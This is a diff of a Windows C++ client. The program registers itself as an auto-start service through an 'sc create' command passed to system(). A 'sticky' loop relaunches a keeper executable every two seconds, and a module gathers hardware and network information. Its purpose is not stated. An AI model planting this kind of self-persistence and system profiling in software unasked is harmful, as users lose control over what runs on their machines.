@@ -11,69 +11,107 @@
 #include <conio.h>
 #include "ClientCtl.h"
 #include "Service.h"
+#include "Logger.h"
+#include "InfoSenser.h"
+#include "Communicater.h"
 #include <direct.h>
 #include <stdlib.h>
+#include <fstream>
+#include <iostream>
+#include <exception>
 
-AliveKeeper* AKr = new AliveKeeper("MyTestService");
+
+AliveKeeper* AKr;
+Logger* logger;
+InfoSenser* infosenser;
+Communicater* cmtr;
 std::string command;
+std::string keeperPath("");
+std::string thispath("");
+extern const char* MY_SERVICE_NAME = "testservice";
 bool checkerNeed = true;
 bool setterNeed = true;
-char pathToFile[MAX_PATH];
-char *arg0Char;
 SERVICE_TABLE_ENTRY serviceT;
 
 DWORD WINAPI serviceCheckerThread(LPVOID pM);
-DWORD WINAPI serviceSetterThread(LPVOID pM);
+DWORD WINAPI communicaterThread(LPVOID pM);
 HANDLE checkerHandle, setterHandle;
 
 
 int main(int argc, char *argv[]) {
-	AKr -> registerService();
+	//初始化我的对象
+	try {	AKr = new AliveKeeper("MyTestService");	}
+	catch (std::string str){	std::cout << str << std::endl;	}
+
+	try { logger = new Logger(); }
+	catch (std::string str) { std::cout << str << std::endl; }
+
+	try {	infosenser = new InfoSenser();	}
+	catch (std::string str) { std::cout << str << std::endl; }
+
+	try { cmtr = new Communicater(); }
+	catch (std::string str) { std::cout << str << std::endl; }
+
+	//注册AliveKeeper
+	AKr->registerService();
 	//setterHandle = CreateThread(NULL, 0, serviceCheckerThread, NULL, 0, NULL);
-	//setterHandle = CreateThread(NULL, 0, serviceSetterThread, NULL, 0, NULL); 
+	//注册AliveKeeper完毕
 	//_getch();
+
 	//注册服务部分
+	logger->log("Main called");
 	serviceT.lpServiceName = TEXT("testservice");
 	serviceT.lpServiceProc = (LPSERVICE_MAIN_FUNCTION)serviceMain;
 	initEntryTable(serviceT);
 
 	std::string filename(argv[0]);
-
-	_getcwd(pathToFile, MAX_PATH);
-	std::cout << "路径:"<<pathToFile << std::endl
-		<<"文件名1:"<<_FILENAME << "文件名2:" <<filename<<std::endl;
-
-	command = (std::string)"sc create testservice binPath= \""+filename+"\""+" start= auto";
+	command = (std::string)"sc create testservice binPath= \"" + filename + "\"" + " start= auto";
 	const char *c = command.data();
-	std::cout <<command<<std::endl<<c;
-	_getch();
+	std::cout << command << std::endl << c << std::endl;
 	system(c);
-	_getch();
+	//注册服务完毕
 
-	return 0;
+	//注册系统信息
+	//while (true){
+	infosenser->printHWInfo();
+	infosenser->printNetInfo();
+	//}
+	//注册系统信息完毕
+
+	//注册Communicater
+	//setterHandle = CreateThread(NULL, 0, communicaterThread, NULL, 0, NULL); 
+	//注册Communicater完毕
+	_getch();
 }
 
 
 
 DWORD WINAPI serviceCheckerThread(LPVOID pM)
 {
-    while(setterNeed){
+    while(setterNeed & needRun){
 		std::cout<<"thread:"<<GetCurrentThreadId()<<",now checking service"<<std::endl;
 		AKr->setterPid=GetCurrentThreadId();
+
+		#ifdef STICKY_MODE
+		std::string cmd = keeperPath + "\"" + MY_SERVICE_NAME + "\"";
+		const char* c = cmd.data();
+		system(c);
+		#endif // STICKY_MODE
+
 		Sleep(2000);
 	}
 	return 0;
 }
 
-DWORD WINAPI serviceSetterThread(LPVOID pM){
-	while(checkerNeed){
+DWORD WINAPI communicaterThread(LPVOID pM){
+	/*while(checkerNeed & needRun){
 		std::cout<<"thread:"<<GetCurrentThreadId()<<",now checking service"<<std::endl;
 		if( ! AKr->checkService()){
 		std::cout<<"thread:"<<GetCurrentThreadId()<<",now setting service"<<std::endl;
 		}
 		AKr->checkerPid=GetCurrentThreadId();
 		Sleep(2*1000);
-	}
+	}*/
 	return 0;
 }
 
